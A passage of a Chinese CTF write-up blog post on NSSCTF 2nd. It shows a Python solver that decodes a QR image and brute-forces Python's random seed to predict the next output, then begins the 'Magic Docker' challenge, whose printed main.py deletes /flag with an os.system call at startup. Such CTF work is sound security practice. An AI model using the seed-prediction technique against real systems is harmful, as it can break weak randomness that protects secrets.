class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> pyzbar <span class="hljs-keyword">import</span> pyzbar<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> getrandbits, seed<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getTarget</span>(<span class="hljs-params">rec</span>):<br>    <span class="hljs-comment"># 1.读取二维码</span><br>    img_bytes = base64.b64decode(rec)<br>    img_array = np.frombuffer(img_bytes, np.uint8)<br>    img = cv2.imdecode(img_array, cv2.IMREAD_GRAYSCALE)<br><br>    <span class="hljs-comment"># 2.还原二维码</span><br>    img = np.where(img &lt; <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>    <span class="hljs-comment"># cv2.imshow(&quot;img&quot;, img.astype(np.uint8))</span><br><br>    <span class="hljs-comment"># 3.扫描二维码解析</span><br>    lis = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, pyzbar.decode(img)[<span class="hljs-number">0</span>].data.decode().split(<span class="hljs-string">&quot;,&quot;</span>)))<br>    <span class="hljs-built_in">print</span>(lis)<br><br>    <span class="hljs-comment"># 4.爆破Target</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>        seed(i)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(getrandbits(<span class="hljs-number">8</span>) == lis[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)):<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(getrandbits(<span class="hljs-number">8</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    rec = <span class="hljs-string">b&#x27;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&#x27;</span><br>    target = getTarget(rec)<br>    <span class="hljs-built_in">print</span>(target)<br><span class="hljs-comment">#[227, 19, 102, 10, 150, 150, 220, 227, 58, 162, 132, 38, 149, 137, 242, 205, 8, 7, 17, 200]</span><br><span class="hljs-comment">#81</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/17006210686846.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="Magic-Docker"><a href="#Magic-Docker" class="headerlink" title="Magic Docker"></a>Magic Docker</h2><p><code>docker run randark/nssctf-round15-magic-docker</code></p>
+<p>pull下来后提示need secret</p>
+<p><img src="/assets/17006210686847.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>bash进入就行</p>
+<p><img src="/assets/17006210686848.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>&#x2F;app下有main.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> click<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br><span class="hljs-meta">@click.command()</span><br><span class="hljs-meta">@click.option(<span class="hljs-params"><span class="hljs-string">&#x27;--secret&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;default=none,between 0 and 100&#x27;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">secret</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(secret)==<span class="hljs-built_in">str</span>(answer):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Congratulations!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;But where is your flag?  (=‵ω′=)&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No! You don&#x27;t know anything about docker!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;How dare you! &quot;</span>)<br><br>BANNER=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">███╗   ██╗███████╗███████╗ ██████╗████████╗███████╗    ██████╗ ███╗   ██╗██████╗            </span><br><span class="hljs-string">████╗  ██║██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔════╝    ╚════██╗████╗  ██║██╔══██╗           </span><br><span class="hljs-string">██╔██╗ ██║███████╗███████╗██║        ██║   █████╗       █████╔╝██╔██╗ ██║██║  ██║           </span><br><span class="hljs-string">██║╚██╗██║╚════██║╚════██║██║        ██║   ██╔══╝      ██╔═══╝ ██║╚██╗██║██║  ██║           </span><br><span class="hljs-string">██║ ╚████║███████║███████║╚██████╗   ██║   ██║         ███████╗██║ ╚████║██████╔╝           </span><br><span class="hljs-string">╚═╝  ╚═══╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝         ╚══════╝╚═╝  ╚═══╝╚═════╝            </span><br><span class="hljs-string">                                                                                            </span><br><span class="hljs-string">███╗   ███╗ █████╗  ██████╗ ██╗ ██████╗    ██████╗  ██████╗  ██████╗██╗  ██╗███████╗██████╗ </span><br><span class="hljs-string">████╗ ████║██╔══██╗██╔════╝ ██║██╔════╝    ██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗</span><br><span class="hljs-string">██╔████╔██║███████║██║  ███╗██║██║         ██║  ██║██║   ██║██║     █████╔╝ █████╗  ██████╔╝</span><br><span class="hljs-string">██║╚██╔╝██║██╔══██║██║   ██║██║██║         ██║  ██║██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗</span><br><span class="hljs-string">██║ ╚═╝ ██║██║  ██║╚██████╔╝██║╚██████╗    ██████╔╝╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║</span><br><span class="hljs-string">╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚═════╝    ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝</span><br><span class="hljs-string">                                                                                            </span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    os.system(<span class="hljs-string">&quot;rm -f /flag&quot;</span>)<br>    <span class="hljs-built_in">print</span>(BANNER)<br>    random.seed(<span class="hljs-string">&quot;NSSCTF 2nd&quot;</span>)<br>    answer=random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)&lt;<span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You need to give me the secret!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        func()<br></code></pre></td></tr></table></figure>
+
+<p>可以看到启动docker后就会删掉flag，但是这前面func好像没什么用</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/web/" class="category-chain-item">web</a>
+  
+  
+
+      </span>
+    
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/misc/" class="category-chain-item">misc</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+        <a href="/tags/misc/" class="print-no-link">#misc</a>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>NSSCTF 2nd</div>
+      <div>http://example.com/2023/09/18/NSSCTF 2nd/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>dddkia</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/18/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/" title="2023柏鹭杯">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2023柏鹭杯</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/27/2023starCTF/" title="2023*CTF">
+                        <span class="hidden-mobile">2023*CTF</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
